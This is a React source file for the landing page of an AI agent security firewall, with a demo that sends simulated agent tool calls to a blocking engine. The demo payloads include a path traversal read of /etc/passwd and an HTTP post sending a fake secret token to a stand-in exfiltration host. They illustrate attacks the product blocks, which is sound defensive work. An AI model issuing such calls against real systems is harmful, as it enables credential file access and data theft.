/**
 * SentinelMesh Public Landing Page
 * Features Aurora Pop visual design, hero section, interactive
 * agent-to-firewall flowchart, live attack simulation preview, and feature cards.
 */

import React, { useState } from 'react';
import {
  Shield,
  Bot,
  Lock,
  Zap,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Sparkles,
  FileCode2,
  Cpu,
  Layers,
  Terminal,
  Play,
  RotateCcw,
} from 'lucide-react';
import type { DecisionType } from '../../shared/types.ts';

interface LandingPageViewProps {
  onOpenAuth: (mode: 'signin' | 'signup') => void;
  onEnterDashboardDemo: () => void;
}

export function LandingPageView({ onOpenAuth, onEnterDashboardDemo }: LandingPageViewProps) {
  // Interactive Gateway visualizer scenario state
  const [activeScenario, setActiveScenario] = useState<'traversal' | 'exfil' | 'valid'>('traversal');
  const [simulating, setSimulating] = useState(false);
  const [simulationResult, setSimulationResult] = useState<{
    decision: DecisionType;
    reason: string;
    rule: string;
    timestamp: string;
  } | null>({
    decision: 'BLOCK',
    reason: 'Path traversal sequence detected in argument [path]. Directory climbing attempts are strictly prohibited.',
    rule: 'RULE_PATH_TRAVERSAL_DETECTED',
    timestamp: 'Just now',
  });

  const handleRunInteractiveDemo = async (scenario: 'traversal' | 'exfil' | 'valid') => {
    setActiveScenario(scenario);
    setSimulating(true);
    setSimulationResult(null);

    // Call live firewall simulation endpoint
    try {
      let payload: {
        agentId: string;
        toolName: string;
        arguments: Record<string, any>;
        isSimulation: boolean;
      } = {
        agentId: 'agent-analyst-01',
        toolName: 'read_file',
        arguments: { path: '../../etc/passwd' },
        isSimulation: true,
      };


      if (scenario === 'exfil') {
        payload = {
          agentId: 'agent-finance-02',
          toolName: 'http_post',
          arguments: {
            url: 'https://exfiltrate-metrics.temp-host.net/api/sink',
            data: { secret_token: 'sk-prod-9921820491', balance: 1400000 },
          },
          isSimulation: true,
        };
      } else if (scenario === 'valid') {
        payload = {
          agentId: 'agent-analyst-01',
          toolName: 'calculate_metrics',
          arguments: { metric: 'quarterly_revenue', values: [120000, 145000, 162000, 189000] },
          isSimulation: true,
        };
      }

      const res = await fetch('/api/simulator/evaluate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (res.ok) {
        const data = await res.json();
        setSimulationResult({
          decision: data.decision,
          reason: data.reason,
          rule: data.matchedRules?.[0] || 'RULE_EVALUATED',
          timestamp: 'Just now',
        });
      }
    } catch {
      // Fallback local demo state
      if (scenario === 'valid') {
        setSimulationResult({
          decision: 'ALLOW',
          reason: 'Tool call verified against policy. Least privilege satisfied.',
          rule: 'RULE_AGENT_AUTHENTICATED',
          timestamp: 'Just now',
        });
      } else {
        setSimulationResult({
          decision: 'BLOCK',
          reason: 'Security violation intercepted by SentinelMesh runtime firewall.',
          rule: scenario === 'traversal' ? 'RULE_PATH_TRAVERSAL_DETECTED' : 'RULE_OUTBOUND_TRANSFER_BLOCKED',
          timestamp: 'Just now',
        });
      }
    } finally {
      setSimulating(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#FFF9F2] bg-aurora-pattern text-[#292638] selection:bg-[#7657F6]/20 selection:text-[#7657F6]">
      {/* Top Navigation Bar */}
      <header className="sticky top-0 z-40 bg-[#FFF9F2]/80 backdrop-blur-md border-b border-[#EAE6F5]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-[#7657F6] to-[#FF786B] p-0.5 shadow-md shadow-[#7657F6]/20">
              <div className="w-full h-full bg-[#FFF9F2] rounded-[10px] flex items-center justify-center">
                <Shield className="w-5 h-5 text-[#7657F6]" />
              </div>
            </div>
            <div>
              <span className="text-xl font-extrabold tracking-tight text-[#292638]">
                Sentinel<span className="text-[#7657F6]">Mesh</span>
              </span>
              <span className="ml-2 text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded-full bg-[#54D6B0]/20 text-[#0f8263] border border-[#54D6B0]/30">
                Gateway
              </span>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <button
              onClick={() => onOpenAuth('signin')}
              className="px-4 py-2 rounded-xl text-xs font-bold text-[#6B6580] hover:text-[#292638] hover:bg-[#F3EDE6] transition-all cursor-pointer"
            >
              Sign In
            </button>
            <button
              onClick={() => onOpenAuth('signup')}
              className="px-4 py-2 rounded-xl bg-[#7657F6] hover:bg-[#6847EB] text-white text-xs font-bold shadow-md shadow-[#7657F6]/20 hover:shadow-lg transition-all cursor-pointer flex items-center gap-1.5"
            >
              <Sparkles className="w-3.5 h-3.5" />
              <span>Get Started</span>
            </button>
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative pt-12 pb-20 px-4 sm:px-6 lg:px-8 overflow-hidden">
        {/* Ambient background glows */}
        <div className="absolute top-10 left-1/2 -translate-x-1/2 w-[700px] h-[350px] bg-gradient-to-b from-[#7657F6]/10 via-[#FF786B]/6 to-transparent rounded-full blur-3xl pointer-events-none" />

        <div className="max-w-4xl mx-auto text-center relative z-10 space-y-6">
          <div className="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full bg-white border border-[#EAE6F5] shadow-sm text-xs font-bold text-[#7657F6]">
            <Sparkles className="w-4 h-4 text-[#FFD66B]" />
            <span>AI Agent Security Firewall & Central Gateway</span>
            <span className="w-1.5 h-1.5 rounded-full bg-[#54D6B0]" />
          </div>

          <h1 className="text-4xl sm:text-6xl font-extrabold tracking-tight text-[#292638] leading-[1.12]">
            Your AI. Your Rules.{' '}
            <span className="bg-gradient-to-r from-[#7657F6] via-[#FF786B] to-[#7657F6] bg-clip-text text-transparent">
              Your Security.
            </span>
          </h1>

          <p className="text-base sm:text-lg text-[#6B6580] max-w-2xl mx-auto font-medium leading-relaxed">
            Protect autonomous agents against prompt injection, malicious tool misuse,
            directory traversal, and unauthorized data egress before execution occurs.
          </p>

          <div className="flex flex-wrap items-center justify-center gap-4 pt-4">
            <button
              onClick={onEnterDashboardDemo}
              className="px-6 py-3.5 rounded-2xl bg-[#7657F6] hover:bg-[#6847EB] text-white font-bold text-sm shadow-xl shadow-[#7657F6]/25 hover:shadow-2xl hover:shadow-[#7657F6]/30 flex items-center gap-2 transition-all cursor-pointer"
            >
              <Shield className="w-4 h-4" />
              <span>Enter Security Dashboard</span>
              <ArrowRight className="w-4 h-4" />
            </button>

            <button
              onClick={() => onOpenAuth('signup')}
              className="px-6 py-3.5 rounded-2xl bg-white hover:bg-[#FFF9F2] text-[#292638] font-bold text-sm border border-[#EAE6F5] shadow-sm hover:border-[#7657F6]/30 transition-all cursor-pointer flex items-center gap-2"
            >
              <Bot className="w-4 h-4 text-[#7657F6]" />
              <span>Register AI Agent</span>
            </button>
          </div>
        </div>
      </section>

      {/* Interactive Gateway Flow Visualizer */}
      <section className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 pb-20">
        <div className="bg-white rounded-3xl p-6 sm:p-10 border border-[#EAE6F5] shadow-xl">
          <div className="text-center max-w-xl mx-auto mb-8">
            <span className="text-xs font-bold uppercase tracking-wider text-[#7657F6]">
              Interactive Architecture Flow
            </span>
            <h2 className="text-2xl font-extrabold text-[#292638] mt-1">
              How SentinelMesh Intercepts Agent Actions
            </h2>
            <p className="text-xs text-[#6B6580] mt-1.5">
              Select an attack simulation scenario below to watch the runtime firewall evaluate,
              render a zero-bypass cryptographic decision, and protect the system.
            </p>
          </div>

          {/* Scenario Buttons */}
          <div className="flex flex-wrap items-center justify-center gap-2.5 mb-10">
            <button
              onClick={() => handleRunInteractiveDemo('traversal')}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-2 ${
                activeScenario === 'traversal'
                  ? 'bg-[#FF786B] text-white shadow-md shadow-[#FF786B]/25'
                  : 'bg-[#FFF9F2] text-[#6B6580] hover:text-[#292638] border border-[#EAE6F5]'
              }`}
            >
              <span>🚨</span>
              <span>Scenario 1: Directory Traversal</span>
            </button>

            <button
              onClick={() => handleRunInteractiveDemo('exfil')}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-2 ${
                activeScenario === 'exfil'
                  ? 'bg-[#FF786B] text-white shadow-md shadow-[#FF786B]/25'
                  : 'bg-[#FFF9F2] text-[#6B6580] hover:text-[#292638] border border-[#EAE6F5]'
              }`}
            >
              <span>📡</span>
              <span>Scenario 2: Data Exfiltration</span>
            </button>

            <button
              onClick={() => handleRunInteractiveDemo('valid')}
              className={`px-4 py-2 rounded-xl text-xs font-bold transition-all cursor-pointer flex items-center gap-2 ${
                activeScenario === 'valid'
                  ? 'bg-[#54D6B0] text-[#0f8263] shadow-md shadow-[#54D6B0]/25'
                  : 'bg-[#FFF9F2] text-[#6B6580] hover:text-[#292638] border border-[#EAE6F5]'
              }`}
            >
              <span>🟢</span>
              <span>Scenario 3: Authorized Safe Action</span>
            </button>
          </div>

          {/* Flow Diagram Cards */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 relative items-center">
            {/* Step 1: AI Agent */}
            <div className="p-6 rounded-2xl bg-[#FFF9F2] border border-[#EAE6F5] space-y-3 relative group">
              <div className="w-10 h-10 rounded-xl bg-[#7657F6]/10 flex items-center justify-center text-[#7657F6]">
                <Bot className="w-5 h-5" />
              </div>
              <div className="text-xs font-semibold uppercase tracking-wider text-[#6B6580]">
                Step 1: AI Agent Invocation
              </div>
              <div className="font-bold text-base text-[#292638]">
                {activeScenario === 'traversal' && 'Analyst Copilot'}
                {activeScenario === 'exfil' && 'Treasury Reconciler'}
                {activeScenario === 'valid' && 'Analyst Copilot'}
              </div>
              <div className="font-mono text-[11px] p-2.5 rounded-lg bg-white border border-[#EAE6F5] text-[#292638] overflow-x-auto">
                {activeScenario === 'traversal' && 'read_file({ path: "../../etc/passwd" })'}
                {activeScenario === 'exfil' && 'http_post({ url: "leak.site", token: "sk_live" })'}
                {activeScenario === 'valid' && 'calculate_metrics({ metric: "kpi" })'}
              </div>
            </div>

            {/* Step 2: SentinelMesh Policy Firewall */}
            <div className="p-6 rounded-2xl bg-white border-2 border-[#7657F6]/40 shadow-lg shadow-[#7657F6]/10 space-y-3 relative">
              <div className="w-10 h-10 rounded-xl bg-[#7657F6] flex items-center justify-center text-white">
                <Shield className="w-5 h-5" />
              </div>
              <div className="text-xs font-semibold uppercase tracking-wider text-[#7657F6]">
                Step 2: SentinelMesh Gateway
              </div>
              <div className="font-bold text-base text-[#292638]">
                Server-Side Policy Engine
              </div>
              <ul className="text-xs text-[#6B6580] space-y-1">
                <li className="flex items-center gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-[#54D6B0]" />
                  <span>HMAC Zero-Bypass Verification</span>
                </li>
                <li className="flex items-center gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-[#54D6B0]" />
                  <span>Whitelist Path Verification</span>
                </li>
                <li className="flex items-center gap-1.5">
                  <CheckCircle2 className="w-3.5 h-3.5 text-[#54D6B0]" />
                  <span>Credential Leak Detection</span>
                </li>
              </ul>
            </div>

            {/* Step 3: Decision & Protected Tool */}
            <div
              className={`p-6 rounded-2xl border transition-all space-y-3 ${
                simulationResult?.decision === 'ALLOW'
                  ? 'bg-[#54D6B0]/10 border-[#54D6B0]/40'
                  : 'bg-[#FF786B]/10 border-[#FF786B]/40'
              }`}
            >
              <div className="flex items-center justify-between">
                <div
                  className={`w-10 h-10 rounded-xl flex items-center justify-center font-bold text-lg ${
                    simulationResult?.decision === 'ALLOW'
                      ? 'bg-[#54D6B0] text-white'
                      : 'bg-[#FF786B] text-white'
                  }`}
                >
                  {simulationResult?.decision === 'ALLOW' ? '✓' : '✕'}
                </div>
                <span
                  className={`text-xs font-extrabold px-2.5 py-1 rounded-full ${
                    simulationResult?.decision === 'ALLOW'
                      ? 'bg-[#54D6B0]/20 text-[#0f8263]'
                      : 'bg-[#FF786B]/20 text-[#FF786B]'
                  }`}
                >
                  {simulationResult?.decision || 'EVALUATING'}
                </span>
              </div>

              <div className="text-xs font-semibold uppercase tracking-wider text-[#6B6580]">
                Step 3: Outcome
              </div>

              <div className="text-xs font-bold text-[#292638]">
                {simulationResult?.reason}
              </div>

              <div className="text-[10px] font-mono text-[#6B6580]">
                Enforced Rule: {simulationResult?.rule}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Feature Showcase Grid */}
      <section className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 pb-24">
        <div className="text-center max-w-2xl mx-auto mb-12">
          <span className="text-xs font-bold uppercase tracking-wider text-[#7657F6]">
            Enterprise-Grade Defenses
          </span>
          <h2 className="text-3xl font-extrabold text-[#292638] mt-1">
            Built for Autonomous AI Workflows
          </h2>
          <p className="text-sm text-[#6B6580] mt-2">
            Eliminate prompt injection risks, sandbox untrusted agents, and enforce compliance
            with complete observability.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <div className="p-6 rounded-2xl bg-white border border-[#EAE6F5] shadow-sm hover:shadow-md transition-shadow space-y-3">
            <div className="w-10 h-10 rounded-xl bg-[#7657F6]/10 flex items-center justify-center text-[#7657F6]">
              <Lock className="w-5 h-5" />
            </div>
            <h3 className="text-base font-bold text-[#292638]">Zero-Bypass Architecture</h3>
            <p className="text-xs text-[#6B6580] leading-relaxed">
              Tools require one-time HMAC-SHA256 cryptographic grants issued exclusively by the
              firewall engine. Agents cannot bypass checks to execute directly.
            </p>
          </div>

          <div className="p-6 rounded-2xl bg-white border border-[#EAE6F5] shadow-sm hover:shadow-md transition-shadow space-y-3">
            <div className="w-10 h-10 rounded-xl bg-[#FF786B]/10 flex items-center justify-center text-[#FF786B]">
              <Cpu className="w-5 h-5" />
            </div>
            <h3 className="text-base font-bold text-[#292638]">Model Context Protocol (MCP)</h3>
            <p className="text-xs text-[#6B6580] leading-relaxed">
              Drop-in JSON-RPC gateway endpoint `/api/gateway/v1/mcp` connects Claude Desktop,
              LangChain, CrewAI, and custom AI agents effortlessly.
            </p>
          </div>

          <div className="p-6 rounded-2xl bg-white border border-[#EAE6F5] shadow-sm hover:shadow-md transition-shadow space-y-3">
            <div className="w-10 h-10 rounded-xl bg-[#54D6B0]/15 flex items-center justify-center text-[#0f8263]">
              <Layers className="w-5 h-5" />
            </div>
            <h3 className="text-base font-bold text-[#292638]">Persistent Audit Compliance</h3>
            <p className="text-xs text-[#6B6580] leading-relaxed">
              Immutable audit trails record every evaluated tool request, argument payload, risk level,
              and policy rule without logging sensitive credentials.
            </p>
          </div>
        </div>
      </section>

      {/* Public Footer */}
      <footer className="border-t border-[#EAE6F5] bg-white py-10 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto flex flex-col sm:flex-row items-center justify-between gap-4 text-xs text-[#6B6580]">
          <div className="flex items-center gap-2">
            <Shield className="w-4 h-4 text-[#7657F6]" />
            <span className="font-bold text-[#292638]">SentinelMesh</span> — AI Agent Security Firewall
          </div>
          <div>Your AI. Your Rules. Your Security. • Built for Google AI Studio</div>
          <div className="flex items-center gap-3">
            <button
              onClick={onEnterDashboardDemo}
              className="text-[#7657F6] font-bold hover:underline cursor-pointer"
            >
              Open Dashboard
            </button>
            <span>•</span>
            <button
              onClick={() => onOpenAuth('signin')}
              className="text-[#6B6580] hover:text-[#292638] cursor-pointer"
            >
              Sign In
            </button>
          </div>
        </div>
      </footer>
    </div>
  );
}
